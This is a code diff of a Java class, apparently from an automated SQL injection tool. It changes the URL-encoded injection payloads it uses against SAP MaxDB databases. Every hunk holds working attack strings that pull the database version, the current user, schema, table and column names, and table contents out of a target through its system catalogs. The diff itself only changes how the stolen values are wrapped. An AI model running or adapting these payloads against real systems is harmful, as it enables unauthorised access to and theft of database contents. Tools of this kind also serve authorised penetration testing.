@@ -15,34 +15,34 @@ public class MaxDbStrategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return
-            "SELECT+replace(hex('MaxDB+(SAP+DB)+'||id||'{%}'||DATABASE()||'{%}'||user()||'{%}'||'%3F'),'00','')||'i'r+from+sysinfo.VERSION";
+            "SELECT+'MaxDB+(SAP+DB)+'||id||'{%}'||DATABASE()||'{%}'||user()||'{%}'||'%3F'||'%01%03%03%07'r+from+sysinfo.VERSION";
     }
 
     @Override
     public String getSchemaList() {
         return
-            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.schemaname)),'00','')||'jj30hh'rr,count(*)c+" +
+            "select+rr||'%01%03%03%07'r+from(select+'%04'||trim(t.schemaname)||'%050%04'rr+" +
             "from(select+distinct+schemaname+from+SCHEMAS)t,(select+distinct+schemaname+from+SCHEMAS)t1+" +
             "where+t.schemaname>=t1.schemaname+" +
-            "group+by+t.schemaname{limit})a,(select+count(distinct+schemaname)nb+from+SCHEMAS)y";
+            "group+by+t.schemaname{limit})a";
     }
 
     @Override
     public String getTableList(Database database) {
         return
-            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.tablename)),'00','')||'jj30hh'rr,count(*)c+" +
+            "select+rr||'%01%03%03%07'r+from(select+'%04'||trim(t.tablename)||'%050%04'rr+" +
             "from(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t,(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t1+" +
             "where+t.tablename>=t1.tablename+" +
-            "group+by+t.tablename{limit})a,(select+count(distinct+tablename)nb+from+TABLES+where+SCHEMANAME='" + database + "')y";
+            "group+by+t.tablename{limit})a";
     }
 
     @Override
     public String getColumnList(Table table) {
         return
-            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.COLUMNNAME)),'00','')||'jj30hh'rr,count(*)c+" +
+            "select+rr||'%01%03%03%07'r+from(select+'%04'||trim(t.COLUMNNAME)||'%050%04'rr+" +
             "from(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t,(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t1+" +
             "where+t.COLUMNNAME>=t1.COLUMNNAME+" +
-            "group+by+t.COLUMNNAME{limit})a,(select+count(distinct+COLUMNNAME)nb+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')y";
+            "group+by+t.COLUMNNAME{limit})a";
     }
 
     @Override
@@ -54,10 +54,10 @@ public class MaxDbStrategy implements ISQLStrategy {
         formatListColumn = "trim(ifnull(chr(" + formatListColumn + "),''))";
         
         return
-            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.s)),'00','')||'jj30hh'rr,count(*)c+" +
+            "select+rr||'%01%03%03%07'r+from(select+'%04'||trim(t.s)||'%050%04'rr+" +
             "from(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t,(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t1+" +
             "where+t.s>=t1.s+" +
-            "group+by+t.s{limit})a,(select+count(distinct+" + formatListColumn + ")nb+from+" + database + "." + table + ")y";
+            "group+by+t.s{limit})a";
     }
 
     @Override
@@ -224,7 +224,7 @@ public class MaxDbStrategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select'SQLi'||rpad('#',1024,'#')||'iLQS'from+dual)"
+                "(select'SQLi$1'||rpad('%23',1024,'%23',1025)||'iLQS'from+dual)"
             );
     }
 
